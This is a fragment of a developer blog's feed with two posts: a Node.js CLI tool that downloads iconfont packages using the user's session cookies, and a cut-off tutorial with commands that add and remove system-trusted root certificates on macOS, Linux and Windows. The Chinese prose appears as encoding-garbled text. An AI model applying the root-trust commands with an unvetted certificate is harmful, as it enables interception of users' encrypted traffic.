class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(<span class="params">program.init</span>)</span>&#123;</span><br><span class="line">    inquirer.prompt([&#123;</span><br><span class="line">        type: <span class="string">&#x27;input&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;iconAddr&#x27;</span>,</span><br><span class="line">        message: <span class="string">&#x27;è¯·è¾“å…¥iconfontçš„é¡¹ç›®ä¸‹è½½åœ°å€:\n&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        type: <span class="string">&#x27;input&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;iconCookies&#x27;</span>,</span><br><span class="line">        message: <span class="string">&#x27;è¯·è¾“å…¥iconfontçš„Cookies:\n&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        type: <span class="string">&#x27;input&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;iconPath&#x27;</span>,</span><br><span class="line">        message: <span class="string">&#x27;è¯·è¾“å…¥ä¿å­˜iconfontçš„ç»å¯¹è·¯å¾„:\n&#x27;</span></span><br><span class="line">    &#125;]).then(<span class="function">(<span class="params">answers</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;iconAddr,iconCookies,iconPath&#125; = answers;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">setIconInfo(iconAddr,iconCookies,iconPath)</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(logSymbols.success, chalk.green(<span class="string">&#x27;è®¾ç½®å®Œæ¯•ï¼Œå¼€å§‹ä¸‹è½½&#x27;</span>));</span><br><span class="line">            getIconfont();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(logSymbols.error, chalk.red(<span class="string">&#x27;è®¾ç½®å¤±è´¥,å†è¯•ä¸€æ¬¡&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ruquestæºå¸¦è‡ªå®šä¹‰cookie"><a href="#ruquestæºå¸¦è‡ªå®šä¹‰cookie" class="headerlink" title="ruquestæºå¸¦è‡ªå®šä¹‰cookie"></a>ruquestæºå¸¦è‡ªå®šä¹‰cookie</h4><p>å°è£…requestè¯·æ±‚ä¸ºåŒæ­¥æ–¹æ³•ï¼Œè‡³äºæ€ä¹ˆä¼ å…¥cookie,éƒ½æ”¾åˆ°hearderså­—æ–­ä¸­å³å¯ã€‚å®Œäº†ä½¿ç”¨pipeç®¡é“é‡Šæ”¾iconfontå­—èŠ‚é›†æ•°æ®åˆ°å¯¹åº”çš„ç›®å½•å³å¯ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">requestSync</span>(<span class="params">url, cookies</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> options = &#123;</span><br><span class="line">            url: url,</span><br><span class="line">            headers: &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36`</span>,</span><br><span class="line">            Cookie: cookies</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        request(options,<span class="function"><span class="keyword">function</span>(<span class="params">e,r,b</span>)</span>&#123;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">                reject(e);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                resolve(b);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).pipe(fs.createWriteStream(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../iconfont.zip`</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ–‡ä»¶éå†å°è£…"><a href="#æ–‡ä»¶éå†å°è£…" class="headerlink" title="æ–‡ä»¶éå†å°è£…"></a>æ–‡ä»¶éå†å°è£…</h4><p>å…¶å®ä¹Ÿä¸èƒ½è¯´æ˜¯å°è£…ï¼Œä¸»è¦æ˜¯è¯´ä¸‹è¿™ä¸ªwalkeråº“ã€‚<br>walk.walk(); è¦ä¼ å…¥éå†æŸ¥è¯¢çš„æ ¹ç›®å½•ã€‚è¿”å›ä¸€ä¸ª walkeræ‰§è¡Œå¯¹è±¡ã€‚<br>å‰©ä¸‹çš„åªéœ€è¦ walker.on(â€˜äº‹ä»¶â€™,ï¼ˆroot, fileStats, next); è¿™ä¸ªæ¨¡å—è¿˜æ˜¯è®¾è®¡æ¯”è¾ƒèˆ’æœçš„ã€‚æœ‰koa æ´‹è‘±æ¨¡å‹çš„æ€æƒ³ã€‚fileStatus æ˜¯éå†å¤„æ–‡ä»¶çš„ä¸€ç³»åˆ—ä¿¡æ¯ï¼Œnext()æ‰§è¡Œä¸‹ä¸€ä¸ªã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">moveIconfont</span>(<span class="params">iconPath</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> walker = walk.walk(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../temp`</span>);</span><br><span class="line">    <span class="keyword">const</span> iconFiles = [<span class="string">&#x27;iconfont.css&#x27;</span>, <span class="string">&#x27;iconfont.eot&#x27;</span>, <span class="string">&#x27;iconfont.js&#x27;</span>, <span class="string">&#x27;iconfont.svg&#x27;</span>, <span class="string">&#x27;iconfont.ttf&#x27;</span>, <span class="string">&#x27;iconfont.woff&#x27;</span>];</span><br><span class="line">    walker.on(<span class="string">&quot;file&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">root, fileStats, next</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (iconFiles.includes(fileStats.name))&#123;</span><br><span class="line">            fse.moveSync(<span class="string">`<span class="subst">$&#123;root&#125;</span>/<span class="subst">$&#123;fileStats.name&#125;</span>`</span>, <span class="string">`<span class="subst">$&#123;iconPath&#125;</span>/<span class="subst">$&#123;fileStats.name&#125;</span>`</span>, &#123; <span class="attr">overwrite</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        next();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    walker.on(<span class="string">&quot;errors&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">root, nodeStatsArray, next</span>) </span>&#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    walker.on(<span class="string">&quot;end&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(logSymbols.success, chalk.green(<span class="string">&quot;ä¸‹è½½å®Œæ¯•&quot;</span>));</span><br><span class="line">        fse.removeSync(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../temp`</span>);</span><br><span class="line">        fse.removeSync(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../iconfont.zip`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><p>okIcon<a href="https://github.com/1160007652/okIcon">GitHub</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env node</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fse = <span class="built_in">require</span>(<span class="string">&#x27;fs-extra&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> program = <span class="built_in">require</span>(<span class="string">&#x27;commander&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> inquirer = <span class="built_in">require</span>(<span class="string">&#x27;inquirer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">&#x27;request&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> logSymbols = <span class="built_in">require</span>(<span class="string">&#x27;log-symbols&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> chalk = <span class="built_in">require</span>(<span class="string">&#x27;chalk&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> spawn = <span class="built_in">require</span>(<span class="string">&#x27;cross-spawn&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> walk = <span class="built_in">require</span>(<span class="string">&#x27;walk&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> configPath = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../config.ini`</span>;</span><br><span class="line"></span><br><span class="line">program.version(<span class="string">&#x27;1.0.0&#x27;</span>, <span class="string">&#x27;-v, --version&#x27;</span>)</span><br><span class="line">    .option(<span class="string">&#x27;-i, --init&#x27;</span>, <span class="string">&#x27;åˆå§‹åŒ–é…ç½®æ–‡ä»¶&#x27;</span>)</span><br><span class="line">    .option(<span class="string">&#x27;-d, --download&#x27;</span>, <span class="string">&#x27;ä¸‹è½½iconfontæ–‡ä»¶&#x27;</span>)</span><br><span class="line">    .description(<span class="string">&#x27;è‡ªåŠ¨ä¸‹è½½IconFontåŠ©æ‰‹&#x27;</span>);</span><br><span class="line"></span><br><span class="line">program.on(<span class="string">&#x27;--help&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;\n-------------------------------------\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;å…ˆä½¿ç”¨ okIcon -i è¿›è¡Œåˆå§‹åŒ–\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;åç»­iconfontçš„æ”¹åŠ¨ï¼Œä½¿ç”¨ okIcon -d è¿›è¡Œä¸‹è½½\n&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">program.parse(process.argv);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">if</span>(<span class="params">program.init</span>)</span>&#123;</span><br><span class="line">    inquirer.prompt([&#123;</span><br><span class="line">        type: <span class="string">&#x27;input&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;iconAddr&#x27;</span>,</span><br><span class="line">        message: <span class="string">&#x27;è¯·è¾“å…¥iconfontçš„é¡¹ç›®ä¸‹è½½åœ°å€:\n&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        type: <span class="string">&#x27;input&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;iconCookies&#x27;</span>,</span><br><span class="line">        message: <span class="string">&#x27;è¯·è¾“å…¥iconfontçš„Cookies:\n&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        type: <span class="string">&#x27;input&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;iconPath&#x27;</span>,</span><br><span class="line">        message: <span class="string">&#x27;è¯·è¾“å…¥ä¿å­˜iconfontçš„ç»å¯¹è·¯å¾„:\n&#x27;</span></span><br><span class="line">    &#125;]).then(<span class="function">(<span class="params">answers</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;iconAddr,iconCookies,iconPath&#125; = answers;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">setIconInfo(iconAddr,iconCookies,iconPath)</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(logSymbols.success, chalk.green(<span class="string">&#x27;è®¾ç½®å®Œæ¯•ï¼Œå¼€å§‹ä¸‹è½½&#x27;</span>));</span><br><span class="line">            getIconfont();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(logSymbols.error, chalk.red(<span class="string">&#x27;è®¾ç½®å¤±è´¥,å†è¯•ä¸€æ¬¡&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">if</span>(<span class="params">program.download</span>)</span>&#123;</span><br><span class="line">    getIconfont();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIconfont</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// iconfont ä¸‹è½½é…ç½®æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">let</span> configData = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ›å»ºå­˜æ”¾ iconfont è§£å‹æ•°æ®çš„ä¸´æ—¶ç›®å½•</span></span><br><span class="line">    fse.ensureDirSync(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../temp`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(fs.existsSync(configPath) &amp;&amp; fs.existsSync(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../temp`</span>))&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                configData = <span class="built_in">JSON</span>.parse(fs.readFileSync(configPath));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(logSymbols.warning, chalk.yellow(<span class="string">&#x27;è¯»å–é…ç½®æ–‡ä»¶å¤±è´¥&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(logSymbols.info, <span class="string">&quot;è¿˜æœªåˆå§‹åŒ–,è¯·æ‰§è¡Œ&quot;</span>, chalk.blue(<span class="string">&#x27; okIcon -i&#x27;</span>));</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(logSymbols.info, <span class="string">&quot;è¿˜æœªåˆå§‹åŒ–,è¯·æ‰§è¡Œ&quot;</span>, chalk.blue(<span class="string">&#x27; okIcon -i&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŒæ­¥ä»é˜¿é‡Œè·å– iconfont</span></span><br><span class="line">    requestSync(configData.iconAddr, configData.iconCookies).then(<span class="function">()=&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è§£å‹iconfont configData.iconPath</span></span><br><span class="line">        spawn.sync(<span class="string">&#x27;tar&#x27;</span>, [<span class="string">&#x27;zxf&#x27;</span>, <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../iconfont.zip`</span>, <span class="string">&#x27;-C&#x27;</span>, <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../temp`</span>], &#123; <span class="attr">stdio</span>: <span class="string">&#x27;inherit&#x27;</span> &#125;);</span><br><span class="line">        </span><br><span class="line">        moveIconfont(configData.iconPath);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setIconInfo</span>(<span class="params">iconAddr,iconCookies,iconPath</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> source = &#123; iconAddr, iconCookies, iconPath &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> s = fs.writeFileSync(configPath, <span class="built_in">JSON</span>.stringify(source));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">requestSync</span>(<span class="params">url, cookies</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> options = &#123;</span><br><span class="line">            url: url,</span><br><span class="line">            headers: &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36`</span>,</span><br><span class="line">            Cookie: cookies</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        request(options,<span class="function"><span class="keyword">function</span>(<span class="params">e,r,b</span>)</span>&#123;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">                reject(e);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                resolve(b);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).pipe(fs.createWriteStream(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../iconfont.zip`</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">moveIconfont</span>(<span class="params">iconPath</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> walker = walk.walk(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../temp`</span>);</span><br><span class="line">    <span class="keyword">const</span> iconFiles = [<span class="string">&#x27;iconfont.css&#x27;</span>, <span class="string">&#x27;iconfont.eot&#x27;</span>, <span class="string">&#x27;iconfont.js&#x27;</span>, <span class="string">&#x27;iconfont.svg&#x27;</span>, <span class="string">&#x27;iconfont.ttf&#x27;</span>, <span class="string">&#x27;iconfont.woff&#x27;</span>];</span><br><span class="line">    walker.on(<span class="string">&quot;file&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">root, fileStats, next</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (iconFiles.includes(fileStats.name))&#123;</span><br><span class="line">            fse.moveSync(<span class="string">`<span class="subst">$&#123;root&#125;</span>/<span class="subst">$&#123;fileStats.name&#125;</span>`</span>, <span class="string">`<span class="subst">$&#123;iconPath&#125;</span>/<span class="subst">$&#123;fileStats.name&#125;</span>`</span>, &#123; <span class="attr">overwrite</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        next();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    walker.on(<span class="string">&quot;errors&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">root, nodeStatsArray, next</span>) </span>&#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    walker.on(<span class="string">&quot;end&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(logSymbols.success, chalk.green(<span class="string">&quot;ä¸‹è½½å®Œæ¯•&quot;</span>));</span><br><span class="line">        fse.removeSync(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../temp`</span>);</span><br><span class="line">        fse.removeSync(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../iconfont.zip`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> cli </tag>
            
            <tag> npm </tag>
            
            <tag> iconfont </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Electron-cer è·¨å¹³å°è¯ä¹¦å®‰è£…</title>
      <link href="posts/554d6708/"/>
      <url>posts/554d6708/</url>
      
        <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>è¿™æ˜¯ä¸€ä»½å…³äºè¯ä¹¦å®‰è£…çš„æ•™ç¨‹ï¼Œé‡‡ç”¨<strong>electron</strong>å»å®ç°è·¨å¹³å°è¯ä¹¦å®‰è£…ã€‚</p><h3 id="shell-å‘½ä»¤"><a href="#shell-å‘½ä»¤" class="headerlink" title="shell å‘½ä»¤"></a>shell å‘½ä»¤</h3><a id="more"></a><h4 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h4><p>åˆ—å‡ºè¯ä¹¦</p><blockquote><p>sudo security dump-keychain /Library/Keychains/System.keychain</p></blockquote><p>å®‰è£…è¯ä¹¦</p><blockquote><p>sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/cer.crt</p></blockquote><p>åˆ é™¤è¯ä¹¦</p><blockquote><p>sudo security delete-certificate -c â€œOK Group Certificate Authorityâ€</p></blockquote><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><p>åˆ—å‡ºè¯ä¹¦</p><blockquote><p>ls /usr/local/share/ca-certificates/</p></blockquote><p>å®‰è£…è¯ä¹¦</p><blockquote><p>æ‹·è´è¯ä¹¦åˆ°ã€ç›®å½•ï¼š/usr/local/share/ca-certificates/ã€‘<br>å‘½ä»¤ï¼š sudo cp cer.crt /usr/local/share/ca-certificates/foo.crt<br>æ›´æ–°CAè¯ä¹¦æ•°æ®åº“å­˜å‚¨ï¼šsudo update-ca-certificates</p></blockquote><p>åˆ é™¤è¯ä¹¦</p><blockquote><p>æŠŠè¯ä¹¦ä»ã€ç›®å½•ï¼š/usr/local/share/ca-certificates/ã€‘ä¸­åˆ é™¤<br>å‘½ä»¤ï¼š sudo rm /usr/local/share/ca-certificates/cer.crt<br>æ›´æ–°CAè¯ä¹¦æ•°æ®åº“å­˜å‚¨ï¼šsudo update-ca-certificates â€“fresh</p></blockquote><h4 id="linux-centos-6"><a href="#linux-centos-6" class="headerlink" title="linux (centos 6)"></a>linux (centos 6)</h4><p>åˆ—å‡ºè¯ä¹¦</p><blockquote><p>ls /etc/pki/ca-trust/source/anchors/</p></blockquote><p>å®‰è£…è¯ä¹¦</p><blockquote><p>å®‰è£…ca-certificatesåŒ…ï¼š yum install ca-certificates<br>å¯ç”¨åŠ¨æ€CAé…ç½®åŠŸèƒ½ï¼š update-ca-trust force-enable<br>å°†å…¶ä½œä¸ºæ–°æ–‡ä»¶æ·»åŠ åˆ°ã€ç›®å½•ï¼š/etc/pki/ca-trust/source/anchors/ã€‘ ä¸­<br>å‘½ä»¤ï¼šcp OK_Group_OA.crt /etc/pki/ca-trust/source/anchors/<br>æ›´æ–°è¯ä¹¦å­˜å‚¨ï¼šupdate-ca-trust extract</p></blockquote><p>åˆ é™¤è¯ä¹¦</p><blockquote><p>æŠŠè¯ä¹¦ä»ã€ç›®å½•ï¼š/etc/pki/ca-trust/source/anchors/ã€‘ä¸­åˆ é™¤<br>å‘½ä»¤ï¼š sudo rm /etc/pki/ca-trust/source/anchors/cer.crt<br>æ›´æ–°CAè¯ä¹¦æ•°æ®åº“å­˜å‚¨ï¼šsudo update-ca-trust extract</p></blockquote><h4 id="linux-centos-5"><a href="#linux-centos-5" class="headerlink" title="linux (centos 5)"></a>linux (centos 5)</h4><p>åˆ—å‡ºè¯ä¹¦</p><blockquote><p>åˆ—å‡ºè¯ä¹¦åŠŸèƒ½ éœ€è¦å» <strong>ca-bundle.crt</strong> æ–‡ä»¶ä¸­æŸ¥çœ‹ã€‚</p></blockquote><p>å®‰è£…è¯ä¹¦</p><blockquote><p>æŠŠå¯ä¿¡è¯ä¹¦é™„åŠ åˆ°ã€æ–‡ä»¶ï¼š/etc/pki/tls/certs/ca-bundle.crtã€‘ ä¸­ï¼Œä¹Ÿå°±æ˜¯è¿½åŠ åˆ°æ–‡æœ¬æœ«å°¾<br>å‘½ä»¤ï¼šcat OK_Group_OA.crt &gt;&gt;/etc/pki/tls/certs/ca-bundle.crt</p></blockquote><p>åˆ é™¤è¯ä¹¦</p><blockquote><p>æŠŠ OK_Group_OA.crt çš„å†…å®¹åˆ é™¤æ‰ï¼Œå³å¯ã€‚<br>vim /etc/pki/tls/certs/ca-bundle.crt<br>åˆ é™¤å®Œï¼Œ :wq ä¿å­˜ </p></blockquote><h4 id="windows-10-windows-7"><a href="#windows-10-windows-7" class="headerlink" title="windows-10 || windows-7"></a>windows-10 || windows-7</h4><p>åˆ—å‡ºè¯ä¹¦</p><blockquote><p>cmd è¿è¡Œ certmgr.msc</p></blockquote><p>å®‰è£…è¯ä¹¦</p><blockquote><p>certutil -addstore -f â€œROOTâ€ cer.crt</p></blockquote><p>åˆ é™¤è¯ä¹¦</p><blockquote><p>certutil -delstore â€œROOTâ€ serial-number-hex</p></blockquote><h3 